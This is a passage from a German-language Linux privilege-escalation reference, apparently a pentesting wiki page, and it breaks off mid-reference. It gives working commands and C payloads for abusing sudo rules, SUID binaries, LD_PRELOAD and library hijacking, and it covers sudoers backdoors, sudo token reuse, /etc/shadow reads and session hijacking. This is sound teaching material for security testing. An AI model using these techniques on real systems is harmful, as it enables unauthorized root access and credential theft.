Beachte, dass wenn du Schreibrechte auf den docker socket hast, weil du **in der Gruppe `docker`** bist, du [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Wenn du feststellst, dass du den **`ctr`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Wenn du feststellst, dass du den **`runc`**-Befehl verwenden kannst, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgefeiltes Interprozess-Kommunikationssystem (inter-Process Communication, IPC), das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Es wurde mit Blick auf moderne Linux-Systeme entwickelt und bietet ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC-Funktionalität, die den Datenaustausch zwischen Prozessen verbessert, vergleichbar mit verbesserten UNIX-Domain-Sockets. Darüber hinaus hilft es beim Senden von Events oder Signalen, was eine nahtlose Integration zwischen Systemkomponenten fördert. Beispielsweise kann ein Signal von einem Bluetooth-Daemon über einen eingehenden Anruf einen Musik-Player dazu veranlassen, stummzuschalten, um die Benutzererfahrung zu verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und Prozesse stromlinienförmiger macht, die traditionell komplex waren.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signal-Emissionen usw.) basierend auf der kumulativen Wirkung passender Policy-Regeln. Diese Policies spezifizieren Interaktionen mit dem Bus und können durch Ausnutzung dieser Berechtigungen potenziell zu einer Privilege Escalation führen.

Ein Beispiel für eine solche Policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt, das Berechtigungen für den root-Benutzer beschreibt, Eigentümer von `fi.w1.wpa_supplicant1` zu sein sowie Nachrichten an dieses Objekt zu senden und zu empfangen.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten universell, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Policies abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine herauszufinden.

### Generische enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Prüfe immer Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du Traffic sniffen kannst. Wenn ja, könntest du einige Credentials abgreifen.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Prüfe, **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** im System vorhanden sind, welche sich **anmelden** können und welche **root-Privilegien** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der Benutzern mit **UID > INT_MAX** erlaubt, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen mit:** **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich (wenn möglich) etwas Interessantes in der Zwischenablage befindet.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort der Umgebung kennst**, versuche dich **mit dem Passwort als jeden Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu erzeugen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem `-a` Parameter ebenfalls, Benutzer zu brute-forcen.

## Missbrauch schreibbarer PATHs

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, könntest du möglicherweise escalate privileges erreichen, indem du **eine backdoor im schreibbaren Ordner erstellst** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der vor deinem schreibbaren Ordner im $PATH liegt**.

### SUDO and SUID

Du könntest berechtigt sein, einen Befehl mit sudo auszuführen, oder er könnte das suid-Bit gesetzt haben. Überprüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es Ihnen, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-Konfiguration kann es einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne dessen Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine shell zu erhalten, indem man einen ssh key in das `root`-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, während der Ausführung von etwas eine **Umgebungsvariable zu setzen**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python library zu laden, während das script als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV beibehalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn ein erlaubtes Kommando aufgerufen wird.

- Warum das funktioniert: Bei nicht-interaktiven Shells wertet Bash `$BASH_ENV` aus und liest diese Datei ein (sourced), bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten eingelesen (sourced).

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`; bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für sudo-erlaubte Befehle; verwende möglichst minimale Binaries.
- Erwäge sudo I/O-Logging und Alerting, wenn erhaltene env-Variablen verwendet werden.

### Sudo-Ausführungs-Umgehungspfade

**Springe**, um andere Dateien zu lesen oder verwende **symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn eine **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Wenn die **sudo permission** für einen einzelnen Befehl **ohne Angabe des Pfads** vergeben ist: _hacker10 ALL= (root) less_ kann man das ausnutzen, indem man die PATH-Variable ändert
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer merkwürdigen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine Funktion zu erstellen und zu **exportieren**, die den Namen des vom suid-File aufgerufenen Befehls trägt.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann, wenn du das suid binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD**-Umgebungsvariable wird verwendet, um eine oder mehrere shared libraries (.so files) anzugeben, die vom Loader vor allen anderen geladen werden, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Library bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass dieses Feature ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die reale User-ID (_ruid_) nicht mit der effektiven User-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Eine Privilege-Eskalation kann auftreten, wenn du Befehle mit `sudo` ausführen darfst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei mit `sudo` ausgeführten Befehlen berücksichtigt wird, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich, **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der attacker die **LD_LIBRARY_PATH** env variable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Rechten stößt, das ungewöhnlich erscheint, ist es gute Praxis zu überprüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich prüfen, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ darauf hin, dass eine exploitation möglich ist.

Zur exploitation erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code verfolgt, sobald er kompiliert und ausgeführt wurde, das Ziel, privileges zu erhöhen, indem er Dateiberechtigungen manipuliert und eine shell mit erhöhten privileges startet.

Kompiliere die obenstehende C file zu einer shared object (.so) Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei den Exploit auslösen und somit eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die library in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie zum Beispiel erhalten
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Voraussetzungen, um Privilegien zu eskalieren:

- Sie haben bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten** **`sudo`** verwendet, um etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` ohne Eingabe eines Passworts zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (Sie können es hochladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder permanent die Datei `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **zweite exploit** (`exploit_v2.sh`) wird eine sh-Shell in _/tmp_ erstellen, die **im Besitz von root ist und setuid hat**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird **eine sudoers file erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **write permissions** in dem Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **create a sudo token for a user and PID**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine shell als dieser user mit PID 1234 hast, kannst du **obtain sudo privileges** ohne das Passwort zu kennen erlangen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du irgendeine Datei **schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du Schreibzugriff hast, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo` binary, etwa `doas` für OpenBSD. Überprüfe dessen Konfiguration in `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **user usually connects to a machine and uses `sudo`** um Privilegien zu eskalieren und du eine shell innerhalb dieses user-Kontexts hast, kannst du **create a new sudo executable** die deinen Code als root und danach den Befehl des users ausführt. Danach **modify the $PATH** des user-Kontexts (zum Beispiel durch Hinzufügen des neuen Pfades in .bash_profile), sodass beim Ausführen von `sudo` durch den user dein sudo executable ausgeführt wird.

Beachte, dass wenn der user eine andere shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Eintrag: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **zeigen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte hat** auf einen der angegebenen Pfade: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, auf den in einer der Konfigurationsdateien in `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er in der Lage sein, Privilegien zu eskalieren.\
Siehe **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch Kopieren der lib nach `/var/tmp/flag15/` wird sie an dieser Stelle vom Programm verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einen **Teil der verfügbaren root-Privilegien für einen Prozess** dar. Dadurch werden root-**Privilegien in kleinere und unterscheidbare Einheiten aufgebrochen**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. Auf diese Weise wird die Gesamtheit der Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über capabilities und wie man sie missbrauchen kann** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis impliziert das **Bit für "execute"**, dass der betroffene Benutzer "**cd**" in den Ordner wechseln kann.\
Das **"read"**-Bit impliziert, dass der Benutzer die **Dateien auflisten** kann, und das **"write"**-Bit impliziert, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und können die traditionellen ugo/rwx-Berechtigungen **überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf eine Datei oder ein Verzeichnis, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität ermöglicht eine präzisere Zugriffsverwaltung**. Weitere Details finden sich [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** Benutzer "kali" read und write Berechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Hole** Dateien mit bestimmten ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise einige **shell sessions** eines anderen Benutzers (**root**) **hijack**.\
In **neuesten Versionen** wirst du dich nur zu **screen sessions** deines **eigenen Benutzers** **verbinden** können. Allerdings könntest du **interessante Informationen innerhalb der Session** finden.

### screen sessions hijacking

**Screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1) Session nicht hijacken, wenn ich als nicht-privilegierter Benutzer angemeldet war.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erzeugen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32,768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den öffentlichen ssh-Schlüssel hat, kann man nach dem entsprechenden privaten Schlüssel suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, gibt diese an, ob der Server Anmeldung zu Konten mit leerem Passwort erlaubt. Der Standard ist `no`.

### PermitRootLogin

Gibt an, ob sich root per ssh anmelden kann, der Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: root kann sich nur mit privatem Schlüssel anmelden und nur, wenn 'command'-Optionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die zur Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers** angeben. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn Sie versuchen, sich mit dem **private** key des Benutzers "**testusername**" anzumelden, ssh den public key Ihres Keys mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es Ihnen, **use your local SSH keys instead of leaving keys** (without passphrases!) auf Ihrem Server liegen zu lassen. So werden Sie in der Lage sein, via ssh **jump** **to a host** und von dort **jump to another** host **using** den **key**, der sich auf Ihrem **initial host** befindet.

Sie müssen diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer auf eine andere Maschine wechselt, dieser Host auf die keys zugreifen kann (was ein Sicherheitsproblem ist).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Keyword `AllowAgentForwarding` **erlauben** oder **verweigern** (default is allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise ausnutzen kannst, um Privilegien zu eskalieren**:


{{#ref}}
